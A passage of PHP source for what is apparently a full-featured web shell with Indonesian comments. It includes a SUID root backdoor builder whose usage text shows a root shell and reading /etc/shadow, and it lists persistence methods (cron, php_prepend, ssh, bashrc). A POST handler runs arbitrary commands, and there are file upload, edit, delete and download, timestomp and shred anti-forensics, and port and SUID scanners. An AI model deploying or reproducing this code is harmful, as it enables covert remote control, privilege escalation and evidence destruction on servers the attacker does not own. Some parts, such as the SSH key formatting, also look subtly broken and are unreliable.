        if ($suid_created) {
            $test_result = execute_shell_command("echo 'id' | $suid_path -p 2>&1");
            if (strpos($test_result, 'uid=0(root)') !== false) {
                $suid_test = 'WORKING';
            } else {
                $test_script = '/tmp/.suid_test_' . getmypid() . '.sh';
                execute_shell_command("echo '#!/bin/sh\nid' > $test_script && chmod 777 $test_script");
                $test_result2 = execute_shell_command("$suid_path $test_script 2>&1");
                execute_shell_command("rm -f $test_script");
                $suid_test = (strpos($test_result2, 'uid=0(root)') !== false) ? 'WORKING' : 'NOT_WORKING';
            }
        }
        $ok = $suid_created && $suid_test === 'WORKING';
        $g = "SUID ROOT BACKDOOR\n" . str_repeat('=', 40) . "\n\n";
        $g .= "Status      : " . ($ok ? 'WORKING' : ($suid_created ? 'CREATED (not functional)' : 'GAGAL')) . "\n";
        if ($suid_created) {
            $g .= "Path        : $suid_path\n";
            $g .= "Source      : $suid_source\n";
            $g .= "Permissions : $suid_details\n\n";
            if ($ok) {
                $g .= "[Cara Pakai]\n";
                $g .= "Root shell : $suid_path -p\n";
                $g .= "Run command: $suid_path -p -c 'whoami'\n";
                $g .= "             $suid_path -p -c 'cat /etc/shadow'\n\n";
            } else {
                $g .= "[Status]\n";
                $g .= "Binary SUID dibuat tapi TIDAK functional.\n";
                $g .= "Kernel protections mungkin memblok SUID execution.\n\n";
            }
        } else {
            $g .= "nosuid /tmp : " . ($tmp_nosuid ? 'YES' : 'NO') . "\n";
            $g .= "noexec /tmp : " . ($tmp_noexec ? 'YES' : 'NO') . "\n\n";
            $g .= "[Gagal]\n";
            $g .= "Membutuhkan root access untuk chown root + chmod 4755.\n";
        }
        $g .= "\n[Debug Log]\n" . implode("\n", $log) . "\n";
        return array('success' => $ok, 'type' => $type, 'guide' => $g, 'path' => $suid_created ? $suid_path : null);

    default:
        return array('success' => false, 'type' => $type, 'error' => 'Unknown persistence type', 'guide' => "Error: Tipe persistence '$type' tidak dikenali.\n\nTipe yang tersedia:\ncron, web_backup, php_prepend, ssh, bashrc, web_alias, suid");
    }
}

// SudoRightsScanner class is now embedded in consolidated section above (static method-based)

// Shell command handler - execute command and capture output
if (!empty($_POST['cmd'])) {
    $cmd_dir = isset($_POST['d']) ? $_POST['d'] : (isset($dir) ? $dir : getcwd());
    chdir($cmd_dir);
    $cmd = $_POST['cmd'];

    // Initialize progress emitter jika request progress (CRITICAL FIX #22)
    $emitter = null;
    if (!empty($_POST['enable_progress'])) {
        $emitter = new ProgressEmitter(5); // 5 steps total
        $emitter->emit('Initializing command execution...', 1, 'initializing');
    }

    // Security: basic command validation
    if (strlen($cmd) > 0 && strlen($cmd) < 10000) {
        if ($emitter) $emitter->emit('Executing command...', 2, 'running');

        $result = execute_command_with_timeout($cmd);

        if ($emitter) {
            $emitter->emit('Processing output...', 3, 'running');
        }

        // Construct output
        $output = isset($result['output']) ? $result['output'] : '';
        if ($result['error']) {
            $output .= "\n[STDERR]\n" . $result['error'];
        }

        if ($emitter) {
            if ($result['timed_out']) {
                $emitter->emit('⚠️ Command timeout - showing partial results', 4, 'warning');
            } else {
                $emitter->emit('Processing complete...', 4, 'running');
            }
            $emitter->complete('Command execution finished');
            exit;
        }
    } else {
        if ($emitter) {
            $emitter->error('Invalid command length');
            exit;
        }
        $output = "Error: Invalid command length";
    }
}
if (isset($_POST['new_name']) && $renameTarget) {
    $oldPath = $dir . DIRECTORY_SEPARATOR . $renameTarget;
    $newPath = $dir . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    if (@rename($oldPath, $newPath)) {
        header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
        exit;
    } else {
        $output = "Failed to rename $renameTarget.";
    }
}
if (isset($_POST['save_edit']) && isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . $_POST['edit_file'];
    file_put_contents($targetFile, $_POST['file_content']);
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_FILES['upload_file'])) {
    $uploadedCount = 0;
    $failedCount = 0;
    $fileCount = count($_FILES['upload_file']['name']);
    
    for ($i = 0; $i < $fileCount; $i++) {
        if ($_FILES['upload_file']['error'][$i] === UPLOAD_ERR_OK) {
            $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name'][$i]);
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'][$i], $target)) {
                $uploadedCount++;
            } else {
                $failedCount++;
            }
        } else {
            $failedCount++;
        }
    }
    
    if ($uploadedCount > 0 && $failedCount === 0) {
        $output = "✅ Upload successful: $uploadedCount file(s) uploaded.";
    } elseif ($uploadedCount > 0 && $failedCount > 0) {
        $output = "⚠️ Partial success: $uploadedCount uploaded, $failedCount failed.";
    } else {
        $output = "❌ Upload failed for all files.";
    }
}
if (isset($_POST['create_type'], $_POST['create_name'])) {
    $newPath = $dir . DIRECTORY_SEPARATOR . basename($_POST['create_name']);
    if ($_POST['create_type'] === 'file') {
        $content = '';
        if (isset($_POST['create_mode']) && $_POST['create_mode'] === 'content' && isset($_POST['create_content'])) {
            $content = $_POST['create_content'];
        }
        file_put_contents($newPath, $content);
        $output = "File created.";
    } elseif ($_POST['create_type'] === 'dir') {
        mkdir($newPath);
        $output = "Directory created.";
    }
}
if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($filepath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($filepath));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filepath));
        readfile($filepath);
        exit;
    }
}
if (isset($_POST['delete_target'])) {
    $target = $dir . DIRECTORY_SEPARATOR . $_POST['delete_target'];
    if (is_dir($target)) {
        $files = array_diff(scandir($target), ['.', '..']);
        foreach ($files as $file) {
            (is_dir("$target/$file")) ? rmdir_recursive("$target/$file") : unlink("$target/$file");
        }
        rmdir($target);
    } else {
        unlink($target);
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
function rmdir_recursive($dir) {
    $scan = @scandir($dir);
    if ($scan === false) return false;
    $files = array_diff($scan, ['.', '..']);
    foreach ($files as $file) {
        $full = $dir . DIRECTORY_SEPARATOR . $file;
        (is_dir($full)) ? rmdir_recursive($full) : @unlink($full);
    }
    return @rmdir($dir);
}
function fm_get_icon($f, $isDir, $ext) {
    if ($isDir) return '📁';
    $iconMap = [
        'image' => '🖼️', 'video' => '🎬', 'audio' => '🎵', 'archive' => '📦',
        'code' => '💻', 'text' => '📝', 'pdf' => '📕', 'doc' => '📘',
        'sheet' => '📊', 'font' => '🔤', 'exe' => '⚙️', 'key' => '🔑',
    ];
    $typeMap = [
        'jpg' => 'image','jpeg' => 'image','png' => 'image','gif' => 'image','svg' => 'image','webp' => 'image','bmp' => 'image','ico' => 'image',
        'mp4' => 'video','avi' => 'video','mkv' => 'video','mov' => 'video','wmv' => 'video','webm' => 'video','flv' => 'video',
        'mp3' => 'audio','wav' => 'audio','ogg' => 'audio','flac' => 'audio','aac' => 'audio','m4a' => 'audio','wma' => 'audio',
        'zip' => 'archive','tar' => 'archive','gz' => 'archive','bz2' => 'archive','xz' => 'archive','7z' => 'archive','rar' => 'archive','tgz' => 'archive',
        'php' => 'code','js' => 'code','css' => 'code','html' => 'code','htm' => 'code','py' => 'code','rb' => 'code','java' => 'code','c' => 'code','cpp' => 'code','h' => 'code','go' => 'code','rs' => 'code','ts' => 'code','jsx' => 'code','tsx' => 'code','vue' => 'code','sh' => 'code','bash' => 'code','sql' => 'code','xml' => 'code',
        'txt' => 'text','md' => 'text','log' => 'text','csv' => 'text','json' => 'text','yml' => 'text','yaml' => 'text','ini' => 'text','conf' => 'text','cfg' => 'text','env' => 'text','htaccess' => 'text',
        'pdf' => 'pdf',
        'doc' => 'doc','docx' => 'doc','odt' => 'doc','rtf' => 'doc',
        'xls' => 'sheet','xlsx' => 'sheet','ods' => 'sheet',
        'ttf' => 'font','otf' => 'font','woff' => 'font','woff2' => 'font','eot' => 'font',
        'exe' => 'exe','msi' => 'exe','dll' => 'exe','so' => 'exe','bin' => 'exe',
        'pem' => 'key','crt' => 'key','key' => 'key','pub' => 'key',
    ];
    $type = isset($typeMap[$ext]) ? $typeMap[$ext] : '';
    return isset($iconMap[$type]) ? $iconMap[$type] : '📄';
}

function fm_get_file_category($ext) {
    $cats = [
        'image' => ['jpg','jpeg','png','gif','svg','webp','bmp','ico'],
        'video' => ['mp4','avi','mkv','mov','wmv','webm','flv'],
        'audio' => ['mp3','wav','ogg','flac','aac','m4a','wma'],
        'archive' => ['zip','tar','gz','bz2','xz','7z','rar','tgz'],
        'code' => ['php','js','css','html','htm','py','rb','java','c','cpp','h','go','rs','ts','jsx','tsx','vue','sh','bash','sql','xml'],
        'document' => ['txt','md','log','csv','json','yml','yaml','ini','conf','cfg','env','htaccess','pdf','doc','docx','odt','rtf','xls','xlsx','ods'],
    ];
    foreach ($cats as $cat => $exts) { if (in_array($ext, $exts)) return $cat; }
    return 'other';
}

function list_dir($path) {
    $files = @scandir($path);
    if (!$files) return '<div class="error">Cannot open directory</div>';

    $html = "<div class='fm-toolbar'>";
    $html .= "<div class='fm-toolbar-left'>";
    $html .= "<button class='btn small' id='zipSelectedBtn' disabled title='Zip Selected'>📦 Zip</button> ";
    $html .= "<button class='btn small' id='archiveSelectedBtn' disabled title='Create Archive'>🗜️ Archive</button> ";
    $html .= "<button class='btn small' id='copySelectedBtn' disabled title='Copy Selected'>📋 Copy</button> ";
    $html .= "<button class='btn small' id='cutSelectedBtn' disabled title='Cut Selected'>✂️ Cut</button> ";
    $html .= "<button class='btn small' id='pasteBtn' style='display:none' title='Paste'>📌 Paste</button> ";
    $html .= "<button class='btn small' id='bulkDownloadBtn' disabled title='Download Selected'>⬇️ Download</button> ";
    $html .= "<button class='btn small ghost' id='chmodSelectedBtn' disabled>Chmod</button> ";
    $html .= "<button class='btn small ghost' id='timestompSelectedBtn' disabled>⏰ Timestomp</button> ";
    $html .= "<button class='btn small danger' id='deleteSelectedBtn' disabled>🗑️ Delete</button> ";
    $html .= "<button class='btn small danger' id='shredSelectedBtn' disabled title='Secure Delete'>💀 Shred</button>";
    $html .= "</div>";
    $html .= "<div class='fm-toolbar-right'>";
    $html .= "<input type='text' id='fmQuickFilter' placeholder='Quick filter...' class='fm-filter-input'>";
    $html .= "<select id='fmTypeFilter' class='fm-filter-select'><option value=''>All Types</option><option value='image'>Images</option><option value='video'>Video</option><option value='audio'>Audio</option><option value='archive'>Archives</option><option value='code'>Code</option><option value='document'>Documents</option><option value='other'>Other</option></select>";
    $html .= "<button class='btn small ghost' id='fmGridToggle' title='Grid View'>⊞</button> ";
    $html .= "<button class='btn small ghost' id='fmSearchBtn' title='Search Files'>🔍</button> ";
    $html .= "<button class='btn small ghost' id='fmGrepBtn' title='Search Content'>📡 Grep</button> ";
    $html .= "<button class='btn small ghost' id='fmBookmarkBtn' title='Bookmark this directory'>⭐</button>";
    $html .= "</div></div>";

    $html .= "<div id='fmBookmarkBar' class='fm-bookmark-bar' style='display:none'></div>";

    $html .= "<div id='fmGridView' style='display:none' class='fm-grid'></div>";
    $html .= "<div id='fmTableWrap' class='table-wrap'>";
    $html .= "<table class='file-table' id='fmFileTable' data-sort-col='2' data-sort-dir='asc'><thead><tr>";
    $html .= "<th><input type='checkbox' id='selectAll'></th>";
    $html .= "<th></th>";
    $html .= "<th class='sortable sort-asc' onclick='sortTable(2)'>Name <span class='sort-indicator'>↑</span></th>";
    $html .= "<th class='sortable' onclick='sortTable(3)'>Permissions <span class='sort-indicator'></span></th>";
    $html .= "<th class='sortable' onclick='sortTable(4)'>Size <span class='sort-indicator'></span></th>";
    $html .= "<th class='sortable' onclick='sortTable(5)'>Modified <span class='sort-indicator'></span></th>";
    $html .= "<th>Actions</th>";
    $html .= "</tr></thead><tbody>";

    if (realpath($path) !== '/' && realpath($path) !== false) {
        $parent = dirname($path);
        $html .= "<tr class='fm-parent-row'><td></td><td>📂</td><td colspan='5'><a href='?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($parent) . "'>[..]</a></td></tr>";
    }

    $dirs = [];
    $files_list = [];
    foreach ($files as $f) {
        if ($f === "." || $f === "..") continue;
        $full = $path . DIRECTORY_SEPARATOR . $f;
        if (is_dir($full)) { $dirs[] = $f; } else { $files_list[] = $f; }
    }
    natcasesort($dirs);
    natcasesort($files_list);

    foreach (array_merge($dirs, $files_list) as $f) {
        $full = $path . DIRECTORY_SEPARATOR . $f;
        $encoded = htmlspecialchars($f, ENT_QUOTES);
        $urlBase = "?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($path);
        $isDir = is_dir($full);
        $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
        $icon = fm_get_icon($f, $isDir, $ext);
        $category = $isDir ? 'dir' : fm_get_file_category($ext);
        $rawPerms = @fileperms($full);
        $perms = ($rawPerms !== false) ? substr(sprintf('%o', $rawPerms), -4) : '----';
        $rawMtime = @filemtime($full);
        $modTime = ($rawMtime !== false) ? date('d-m-Y H:i:s', $rawMtime) : 'N/A';
        $isArchive = in_array($ext, ['zip','tar','gz','bz2','xz','7z','rar','tgz']);
        $isMedia = in_array($ext, ['jpg','jpeg','png','gif','svg','webp','bmp','ico','mp4','avi','mkv','mov','webm','flv','mp3','wav','ogg','flac','aac','m4a']);
        $isWritable = is_writable($full);
        $isLink = is_link($full);
        $isHidden = false;
        $writableClass = $isWritable ? '' : 'not-writable';
        $hiddenClass = $isHidden ? ' fm-hidden-file' : '';

        $linkClass = $isDir ? 'dir-link' : 'file-link';
        if (!$isWritable) $linkClass .= ' not-writable-text';
        if ($isLink) $linkClass .= ' fm-symlink';

        $escapedF = htmlspecialchars($f, ENT_QUOTES);
        $escapedF_js = addslashes($escapedF);

        if ($isDir) {
            $nameLink = "<a class='$linkClass' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>";
        } elseif ($isMedia) {
            $nameLink = "<a class='$linkClass fm-media' href='javascript:void(0)' onclick='viewFileAsync(\"$escapedF_js\")' ondblclick='fmPreviewMedia(\"$escapedF_js\"); return false;'>$encoded</a>";
        } else {
            if ($isWritable) {
                $nameLink = "<a class='$linkClass' href='javascript:void(0)' onclick='openEditModal(\"$escapedF_js\")'>$encoded</a>";
            } else {
                $nameLink = "<a class='$linkClass' href='javascript:void(0)' onclick='viewFileAsync(\"$escapedF_js\")'>$encoded</a>";
            }
        }

        if ($isLink) {
            $target = @readlink($full);
            $nameLink .= " <span class='fm-link-arrow' title='Symlink → " . htmlspecialchars($target) . "'>→</span>";
        }

        if ($isDir) {
            $size = '-';
            $sizeInBytes = 0;
        } else {
            $sizeInBytes = @filesize($full);
            if ($sizeInBytes === false) { $sizeInBytes = 0; }
            if ($sizeInBytes >= 1073741824) { $size = number_format($sizeInBytes / 1073741824, 2) . ' GB'; }
            elseif ($sizeInBytes >= 1048576) { $size = number_format($sizeInBytes / 1048576, 2) . ' MB'; }
            elseif ($sizeInBytes >= 1024) { $size = number_format($sizeInBytes / 1024, 1) . ' KB'; }
            else { $size = $sizeInBytes . ' B'; }
        }

        $checkbox = "<input type='checkbox' class='file-select' value='$escapedF'>";
        $editClass = $isWritable ? 'action-link' : 'action-link no-edit';
        $editOnclick = $isWritable ? "onclick='openEditModal(\"$escapedF_js\")'" : '';

        $actions = "<a class='action-link' href='javascript:void(0)' onclick='viewFileAsync(\"$escapedF_js\")' title='View'>[V]</a>";
        $actions .= " <a class='$editClass' href='javascript:void(0)' $editOnclick title='Edit'>[E]</a>";
        $actions .= " <a class='action-link' href='javascript:void(0)' onclick='openRenameModal(\"$escapedF_js\")' title='Rename'>[R]</a>";
        $actions .= " <a class='action-link' href='javascript:void(0)' onclick='fmShowInfo(\"$escapedF_js\")' title='Properties'>[i]</a>";
        $actions .= " <a class='action-link' href='javascript:void(0)' onclick='openDeleteModal(\"$escapedF_js\")' title='Delete'>[Del]</a>";
        $actions .= " <a class='action-link' href='$urlBase&download=" . urlencode($f) . "' target='_blank' title='Download'>[DL]</a>";
        if ($isArchive) {
            $actions .= " <a class='action-link' href='javascript:void(0)' onclick='fmExtractArchive(\"$escapedF_js\")' title='Extract'>[Ex]</a>";
            $actions .= " <a class='action-link' href='javascript:void(0)' onclick='fmListArchive(\"$escapedF_js\")' title='List Contents'>[Ls]</a>";
        }
        if (!$isDir && in_array($ext, ['log','txt','conf','cfg','ini','env'])) {
            $actions .= " <a class='action-link' href='javascript:void(0)' onclick='fmTailFile(\"$escapedF_js\")' title='Tail'>[T]</a>";
        }

        $html .= "<tr data-filename='$escapedF' data-category='$category' data-ext='$ext' data-size='$sizeInBytes' class='fm-file-row$hiddenClass' oncontextmenu='fmContextMenu(event, \"$escapedF_js\", " . ($isDir ? 'true' : 'false') . ")'>";
        $html .= "<td class='fm-chk-cell'>$checkbox</td>";
        $html .= "<td class='$writableClass fm-icon-cell'>$icon</td>";
        $html .= "<td data-label='Name'>$nameLink</td>";
        $html .= "<td data-label='Perms'>$perms</td>";
        $html .= "<td data-label='Size' data-bytes='$sizeInBytes'>$size</td>";
        $html .= "<td data-label='Modified'>$modTime</td>";
        $html .= "<td class='fm-actions-cell' data-label=''>$actions</td>";
        $html .= "</tr>";
    }
    $html .= "</tbody></table></div>";
    return $html;
}

// ============================================================================
// SECTION B: FEATURE 1 - CRONTAB EDITOR ENDPOINTS
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'crontab_') === 0) {
    while (ob_get_level() > 0) { ob_end_clean(); }
    header('Content-Type: application/json; charset=utf-8');

    try {
        if (!class_exists('CrontabManager')) {
            safe_json_error('CrontabManager class not found');
        }

        $manager = new CrontabManager();
        $result = null;

        switch($_GET['action']) {
            case 'crontab_list':
                $result = $manager->listEntries();
                if (!is_array($result)) {
                    safe_json_error('Invalid crontab response');
                }
                safe_json_output($result);
                break;

            case 'crontab_add':
                $minute = isset($_POST['minute']) ? $_POST['minute'] : '*';
                $hour = isset($_POST['hour']) ? $_POST['hour'] : '*';
                $day_of_month = isset($_POST['day_of_month']) ? $_POST['day_of_month'] : '*';
                $month = isset($_POST['month']) ? $_POST['month'] : '*';
                $day_of_week = isset($_POST['day_of_week']) ? $_POST['day_of_week'] : '*';
                $command = isset($_POST['command']) ? $_POST['command'] : '';

                if (empty($command)) {
                    safe_json_error('Command is required');
                }

                $result = $manager->addEntry($minute, $hour, $day_of_month, $month, $day_of_week, $command);
                if (!is_array($result)) {
                    safe_json_error('Invalid response from addEntry');
                }
                safe_json_output($result);
                break;

            case 'crontab_delete':
                $line = isset($_POST['line']) ? $_POST['line'] : '';

                if (empty($line)) {
                    safe_json_error('Line number is required');
                }

                $result = $manager->deleteEntry($line);
                if (!is_array($result)) {
                    safe_json_error('Invalid response from deleteEntry');
                }
                safe_json_output($result);
                break;

            case 'crontab_validate':
                $minute = isset($_POST['minute']) ? $_POST['minute'] : '*';
                $hour = isset($_POST['hour']) ? $_POST['hour'] : '*';
                $day_of_month = isset($_POST['day_of_month']) ? $_POST['day_of_month'] : '*';
                $month = isset($_POST['month']) ? $_POST['month'] : '*';
                $day_of_week = isset($_POST['day_of_week']) ? $_POST['day_of_week'] : '*';

                $result = $manager->validateSchedule($minute, $hour, $day_of_month, $month, $day_of_week);
                if (!is_array($result)) {
                    safe_json_error('Invalid response from validateSchedule');
                }
                safe_json_output($result);
                break;

            default:
                safe_json_error('Unknown crontab action');
        }
    } catch (Exception $e) {
        safe_json_error('Crontab error: ' . $e->getMessage());
    }
    exit;
}

// ============================================================================
// SECTION C: FEATURE 2 - FIREWALL CHECKER ENDPOINTS
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'firewall_') === 0) {
    while (ob_get_level() > 0) { ob_end_clean(); }
    header('Content-Type: application/json; charset=utf-8');

    try {
        if (!class_exists('FirewallStatusChecker')) {
            safe_json_error('FirewallStatusChecker class not found');
        }

        $checker = new FirewallStatusChecker();
        $result = null;

        switch($_GET['action']) {
            case 'firewall_status':
                $result = $checker->getStatus();
                break;

            case 'firewall_rules':
                $result = $checker->getRules();
                break;

            case 'firewall_info':
                $result = $checker->getInfo();
                break;

            default:
                safe_json_error('Unknown firewall action');
        }

        if ($result === null || $result === false) {
            safe_json_error('Firewall check returned no data');
        }

        echo json_encode($result);
    } catch (Exception $e) {
        safe_json_error('Firewall error: ' . $e->getMessage());
    }
    exit;
}

// ============================================================================
// SECTION D: FEATURE 3 - HASH CALCULATOR ENDPOINTS
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'hash_') === 0) {
    header('Content-Type: application/json; charset=utf-8');

    try {
        switch($_GET['action']) {
            case 'hash_algorithms':
                echo json_encode([
                    'success' => true,
                    'algorithms' => hash_algos(),
                    'total' => count(hash_algos())
                ]);
                break;

            case 'hash_text':
                $text = isset($_POST['text']) ? $_POST['text'] : '';
                $algorithm = isset($_POST['algorithm']) ? $_POST['algorithm'] : 'sha256';
                $hash = HashCalculator::hashText($text, $algorithm);
                echo json_encode([
                    'success' => true,
                    'hash' => $hash,
                    'algorithm' => $algorithm,
                    'input_length' => strlen($text)
                ]);
                break;

            case 'hash_file':
                $filepath = isset($_POST['filepath']) ? $_POST['filepath'] : '';
                $algorithm = isset($_POST['algorithm']) ? $_POST['algorithm'] : 'sha256';

                if (empty($filepath) || !file_exists($filepath)) {
                    safe_json_error('File not found');
                }

                $result = HashCalculator::hashFile($filepath, $algorithm);
                echo json_encode([
                    'success' => true,
                    'hash' => $result['hash'],
                    'algorithm' => $algorithm,
                    'file' => $result['filename'],
                    'size' => $result['size_formatted']
                ]);
                break;

            case 'hash_compare':
                $hash1 = isset($_POST['hash1']) ? $_POST['hash1'] : '';
                $hash2 = isset($_POST['hash2']) ? $_POST['hash2'] : '';
                $result = HashCalculator::compareHash($hash1, $hash2);
                echo json_encode([
                    'success' => true,
                    'match' => $result['match'],
                    'algorithm' => $result['algorithm']
                ]);
                break;

            default:
                safe_json_error('Unknown hash action');
        }
    } catch (Exception $e) {
        safe_json_error('Hash error: ' . $e->getMessage());
    }
    exit;
}

// ============================================================================
// SECTION E: FEATURE 4 - KERNEL PROTECTION CHECKER ENDPOINTS
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'kernel_') === 0) {
    while (ob_get_level() > 0) { ob_end_clean(); }
    header('Content-Type: application/json; charset=utf-8');

    try {
        switch($_GET['action']) {
            case 'kernel_protections':
                $checker = new KernelProtectionChecker();
                $result = $checker->checkAllProtections();
                if ($result === false) {
                    safe_json_error('Failed to check kernel protections');
                } else {
                    echo json_encode(['success' => true, 'data' => $result]);
                }
                break;

            case 'kernel_aslr':
                $checker = new KernelProtectionChecker();
                $result = $checker->checkASLR();
                echo json_encode(['success' => true, 'data' => $result]);
                break;

            case 'kernel_selinux':
                $checker = new KernelProtectionChecker();
                $result = $checker->checkSELinux();
                echo json_encode(['success' => true, 'data' => $result]);
                break;

            default:
                safe_json_error('Unknown kernel action');
        }
    } catch (Exception $e) {
        safe_json_error('Kernel error: ' . $e->getMessage());
    }
    exit;
}

// ============================================================================
// SECTION F: FEATURE 5 - LOGS VIEWER ENDPOINTS
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'logs_') === 0) {
    while (ob_get_level() > 0) { ob_end_clean(); }
    header('Content-Type: application/json; charset=utf-8');

    try {
        switch($_GET['action']) {
            case 'logs_list':
                $logfiles = [
                    '/var/log/syslog',
                    '/var/log/auth.log',
                    '/var/log/apache2/access.log',
                    '/var/log/apache2/error.log',
                    '/var/log/nginx/access.log',
                    '/var/log/nginx/error.log',
                    '/var/log/php-fpm.log',
                    '/var/log/mysql/error.log'
                ];

                $available = [];
                foreach ($logfiles as $file) {
                    if (file_exists($file) && is_readable($file)) {
                        $available[] = [
                            'path' => $file,
                            'size' => filesize($file),
                            'modified' => filemtime($file)
                        ];
                    }
                }

                echo json_encode([
                    'success' => true,
                    'logs' => $available
                ]);
                break;

            case 'logs_read':
                $filepath = isset($_GET['file']) ? $_GET['file'] : '';
                $lines = max(1, min((int)(isset($_GET['lines']) ? $_GET['lines'] : 100), 1000));

                if (empty($filepath) || !file_exists($filepath) || !is_readable($filepath)) {
                    safe_json_error('Log file not found or not readable');
                }

                $output = execute_shell_command("tail -n " . intval($lines) . " " . escapeshellarg($filepath));
                echo json_encode([
                    'success' => true,
                    'file' => $filepath,
                    'content' => $output ?: '(empty)',
                    'lines' => $lines
                ]);
                break;

            default:
                safe_json_error('Unknown logs action');
        }
    } catch (Exception $e) {
        safe_json_error('Logs error: ' . $e->getMessage());
    }
    exit;
}

// ============================================================================
// SECTION G: FEATURE 6 - PERMISSION TRACKER ENDPOINTS
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'perm_') === 0) {
    while (ob_get_level() > 0) { ob_end_clean(); }
    header('Content-Type: application/json; charset=utf-8');

    try {
        $tracker = new PermissionTracker();

        switch($_GET['action']) {
            case 'perm_check_file':
                $filepath = isset($_POST['filepath']) ? $_POST['filepath'] : '';
                if (empty($filepath)) {
                    safe_json_error('File path required');
                }

                $exists = @file_exists($filepath);
                $perms = $exists ? @fileperms($filepath) : false;
                $result = [
                    'path' => $filepath,
                    'exists' => $exists,
                    'readable' => $exists ? @is_readable($filepath) : false,
                    'writable' => $exists ? @is_writable($filepath) : false,
                    'executable' => $exists ? @is_executable($filepath) : false,
                    'permissions' => ($perms !== false) ? substr(sprintf('%o', $perms), -4) : 'N/A'
                ];

                echo json_encode(['success' => true, 'result' => $result]);
                break;

            case 'perm_find_denied':
                $directory = isset($_POST['directory']) ? $_POST['directory'] : '/';
                $output = execute_shell_command("find " . escapeshellarg($directory) . " -maxdepth 3 2>&1 | head -200");
                $report = $tracker->parse_find_output($output ?: '');
                echo json_encode(['success' => true, 'report' => $report]);
                break;

            default:
                safe_json_error('Unknown permission action');
        }
    } catch (Exception $e) {
        safe_json_error('Permission error: ' . $e->getMessage());
    }
    exit;
}

// ============================================================================
// SECTION H: FEATURE 7 - PORT SCANNER ENDPOINTS
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'port_') === 0) {
    while (ob_get_level() > 0) { ob_end_clean(); }
    header('Content-Type: application/json; charset=utf-8');

    try {
        if (!class_exists('PortScanner')) {
            // Try to load the class again
            $portScannerPath = __DIR__ . '/PortScanner.php';
            if (file_exists($portScannerPath)) {
                @include_once $portScannerPath;
            }

            if (!class_exists('PortScanner')) {
                safe_json_error('PortScanner class not found (path: ' . $portScannerPath . ')');
            }
        }

        $scanner = new PortScanner();
        $results = null;

        switch($_GET['action']) {
            case 'port_scan':
                $host = isset($_POST['host']) ? $_POST['host'] : 'localhost';
                $ports = isset($_POST['ports']) ? $_POST['ports'] : '1-1024';

                if (empty($host)) {
                    safe_json_error('Host required');
                }

                $results = $scanner->scanPorts($host, $ports);
                safe_feature_output(['success' => true, 'results' => $results ?: []]);
                break;

            case 'port_common':
                $results = $scanner->scanCommonPorts();
                safe_feature_output(['success' => true, 'results' => $results ?: []]);
                break;

            case 'port_list':
                $results = $scanner->getOpenPorts();
                safe_feature_output(['success' => true, 'ports' => $results ?: []]);
                break;

            default:
                safe_json_error('Unknown port action');
        }
    } catch (Exception $e) {
        safe_json_error('Port scanner error: ' . $e->getMessage());
    }
    exit;
}

// ============================================================================
// SECTION I: FEATURE 8 - SSH KEY GENERATOR ENDPOINTS
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'ssh_') === 0) {
    while (ob_get_level() > 0) { ob_end_clean(); }
    header('Content-Type: application/json; charset=utf-8');

    try {
        switch($_GET['action']) {
            case 'ssh_generate':
                $keyType = isset($_POST['key_type']) ? $_POST['key_type'] : 'ed25519';
                $email = isset($_POST['email']) ? $_POST['email'] : 'user@example.com';
                $passphrase = isset($_POST['passphrase']) ? $_POST['passphrase'] : '';

                // Check OpenSSL availability
                if (!extension_loaded('openssl')) {
                    safe_json_error('OpenSSL extension not available');
                }

                $config = [
                    'private_key_type' => 'RSA',
                    'private_key_bits' => 2048,
                ];

                if ($keyType === 'ed25519') {
                    $config['private_key_type'] = 'ED25519';
                } elseif ($keyType === 'rsa4096') {
                    $config['private_key_bits'] = 4096;
                }

                $res = @openssl_pkey_new($config);
                if ($res === false) {
                    safe_json_error('Failed to generate key pair: ' . openssl_error_string());
                }

                $privKey = '';
                $pubKey = '';

                if (!openssl_pkey_export($res, $privKey, $passphrase)) {
                    safe_json_error('Failed to export private key: ' . openssl_error_string());
                }

                $pubDetails = openssl_pkey_get_details($res);
                if ($pubDetails === false) {
                    safe_json_error('Failed to get public key details');
                }

                $pubKey = $pubDetails["key"];
                if (empty($pubKey)) {
                    safe_json_error('Public key is empty');
                }

                $sshPubKey = "ssh-rsa " . base64_encode($pubKey) . " $email";

                safe_feature_output([
                    'success' => true,
                    'public_key' => $sshPubKey,
                    'private_key' => $privKey,
                    'key_type' => $keyType
                ]);
                break;

            default:
                safe_json_error('Unknown SSH action');
        }
    } catch (Exception $e) {
        safe_json_error('SSH error: ' . $e->getMessage());
    }
    exit;
}

// ============================================================================
// SECTION J: FEATURE 9 - SUID/SGID SCANNER ENDPOINTS
// ============================================================================

if (isset($_GET['action']) && strpos($_GET['action'], 'suid_') === 0) {
    while (ob_get_level() > 0) { ob_end_clean(); }
    header('Content-Type: application/json; charset=utf-8');

    try {
        $scanner = new SuidSgidScanner();

        switch($_GET['action']) {
            case 'suid_scan':
                $results = $scanner->findSuidFiles();
                echo json_encode(['success' => true, 'suid_files' => $results]);
                break;

            case 'sgid_scan':
                $results = $scanner->findSgidFiles();
